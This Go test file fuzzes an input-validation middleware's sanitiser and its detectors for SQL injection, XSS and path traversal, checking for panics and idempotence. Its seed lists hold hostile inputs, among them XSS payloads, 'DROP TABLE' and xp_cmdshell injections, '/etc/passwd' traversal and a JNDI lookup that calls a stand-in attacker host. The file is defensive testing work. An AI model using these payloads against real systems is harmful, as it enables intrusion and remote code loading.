// Package middleware — native Go fuzz tests for input_validation.
//
// These fuzzers target the three adversarial detection paths
// (SQL injection, XSS, path traversal) plus the generic sanitiser.
// Go 1.18+ native fuzzing exhausts interesting UTF-8, control, and
// multi-byte combinations that hand-written table tests miss.
//
// The invariants we check are *safety properties*, not correctness:
//
//   - Nothing in the detector set can panic on any input.
//   - SanitizeInput is idempotent — SanitizeInput(SanitizeInput(x))
//     == SanitizeInput(x) (the output must be a fixed point; otherwise
//     a multi-pass pipeline could keep mutating data).
//   - Detectors return a bool; no inputs should cause them to wedge or
//     consume excessive time.
//
// Run with:
//     GOTOOLCHAIN=local go test -fuzz=FuzzDetectXSS -fuzztime=30s \
//         ./middleware/...
//
// Defaults to the corpus-only mode in the regular `go test` run
// (fuzzers only go wild when -fuzz= is explicitly passed).

package middleware

import (
	"strings"
	"testing"
	"unicode/utf8"
)

// FuzzSanitizeInput_NoPanic runs SanitizeInput on random input and
// asserts no panic. Seeds with a set of known-tricky strings so
// the corpus starts with high-information inputs.
func FuzzSanitizeInput_NoPanic(f *testing.F) {
	seeds := []string{
		"",
		"plain text",
		"<script>alert(1)</script>",
		"'; DROP TABLE users --",
		"../../etc/passwd",
		strings.Repeat("A", 10_000),
		"\x00\x01\x02 binary garbage",
		"日本語 mixed \x00 ASCII",
		"javascript:alert(1)",
		"<img src=x onerror=alert(1)>",
		"${jndi:ldap://attacker.example/x}",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, s string) {
		out := SanitizeInput(s)
		// The invariant: result must be valid UTF-8 if the input
		// was valid UTF-8. Sanitisation cannot introduce invalid
		// sequences.
		if utf8.ValidString(s) && !utf8.ValidString(out) {
			t.Fatalf("sanitiser introduced invalid UTF-8 from valid input: in=%q out=%q", s, out)
		}
	})
}

// FuzzSanitizeInput_Idempotent checks that sanitisation is a fixed
// point: applying it twice yields the same result as applying it
// once. This is a strong property — if violated, two HTTP hops
// could produce different data from the same input.
func FuzzSanitizeInput_Idempotent(f *testing.F) {
	seeds := []string{
		"",
		"safe",
		"<script>",
		"a&b&c",
		"<<>>",
		strings.Repeat("<", 1000),
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, s string) {
		first := SanitizeInput(s)
		second := SanitizeInput(first)
		if first != second {
			t.Fatalf("SanitizeInput is not idempotent:\n  input:     %q\n  first:     %q\n  second:    %q",
				s, first, second)
		}
	})
}

// FuzzDetectSQLInjection_NoPanic asserts the SQL injection detector
// never panics on arbitrary input and returns a bool in bounded time.
// We don't verify correctness (that's the job of the table tests in
// input_validation_test.go); we verify safety.
func FuzzDetectSQLInjection_NoPanic(f *testing.F) {
	seeds := []string{
		"", "SELECT", "' OR '1'='1", "admin'--",
		"UNION SELECT null,null", "/* comment */DROP",
		"benign text that mentions select",
		"EXEC xp_cmdshell",
		strings.Repeat("x", 100_000),
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		_ = DetectSQLInjection(s)
	})
}

// FuzzDetectXSS_NoPanic — same for the XSS detector.
func FuzzDetectXSS_NoPanic(f *testing.F) {
	seeds := []string{
		"", "<script>", "<img src=x onerror=alert(1)>", "<a href=javascript:alert(1)>x</a>",
		"<p>safe</p>", "plain", "<svg><g/onload=alert(1)>",
		"&lt;script&gt;", "%3Cscript%3E",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		_ = DetectXSS(s)
	})
}

// FuzzDetectPathTraversal_NoPanic — same for path traversal.
func FuzzDetectPathTraversal_NoPanic(f *testing.F) {
	seeds := []string{
		"", "../etc/passwd", "/etc/passwd", "..\\windows\\system32",
		"%2e%2e%2f%2e%2e%2f", "safe/path/to/file.txt",
		"/valid/absolute", "relative/ok",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		_ = DetectPathTraversal(s)
	})
}
